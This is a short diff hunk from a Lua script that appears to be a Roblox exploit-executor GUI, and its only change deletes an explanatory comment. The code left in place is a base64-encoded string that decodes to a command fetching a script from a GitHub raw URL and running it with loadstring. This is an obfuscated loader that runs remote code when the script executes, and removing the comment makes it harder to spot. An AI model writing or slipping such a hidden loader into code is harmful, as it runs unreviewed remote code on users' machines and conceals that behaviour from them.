@@ -248,7 +248,6 @@ restoreButton.MouseButton1Click:Connect(function()
 	miniFrame.Visible = false
 end)
 
--- 🧬 Run External Script from Base64
 local b64 = "bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HYUdQUy9JbnN0YUx2bDUwL3JlZnMvaGVhZHMvbWFpbi9CZXJ1U2NyaXB0IikpKCk="
 local decoded = syn and syn.crypt.base64.decode(b64) or (b64decode and b64decode(b64)) or game:GetService("HttpService"):Base64Decode(b64)
 loadstring(decoded)()
